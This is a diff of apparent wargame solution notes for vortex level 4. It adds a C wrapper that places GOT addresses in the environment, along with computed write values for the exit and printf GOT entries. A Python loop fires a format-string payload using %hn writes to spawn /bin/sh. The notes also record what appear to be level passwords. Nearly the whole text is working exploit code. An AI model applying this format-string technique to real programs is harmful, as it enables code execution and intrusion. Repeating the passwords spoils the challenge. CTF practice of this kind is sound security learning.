@@ -29,6 +29,7 @@ io.interact()
 #vortex4
 #2YmgK1=jw
 
+# v4e.c
 #include <stdlib.h>
 int main(int argc, char **argv) {
         char *envp[] = { "\x14\xa0\x04\x08\x16\xa0\x04\x08\x0c\xa0\x04\x08\x0e\xa0\x04\x08", "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH", argv[1] };
@@ -41,5 +42,17 @@ int main(int argc, char **argv) {
 ...     os.system("./v4e '%"+str(i)+"$x'")
 ...     print "#%d" % i
 
-exit 0x804a014 = 
-./v4e '/bin/sh && ls %2038d%99$hn%9420d%100$hn%22424d%98$hn%29566d%101$n'
+exit:
+0x0804a014(%98$) = 0x8468 = 33896
+0x0804a016(%99$) = 0x0804 = 2052
+printf:
+0x0804a00c(%100$) = 0x2cd0 = 11472
+0x0804a00e(%101$) = 0xf7e6 = 63462
+
+import os
+for i in xrange(95, 105):
+        os.system("./v4e '/bin/sh && ls %02038x%"+str(i+1)+"$hn%09420x%"+str(i+2)+"$hn%022424x%"+str(i)+"$hn%029566x%"+str(i+3)+"$naa'")
+        print i
+
+#vortex5
+#:4VtbC4lr
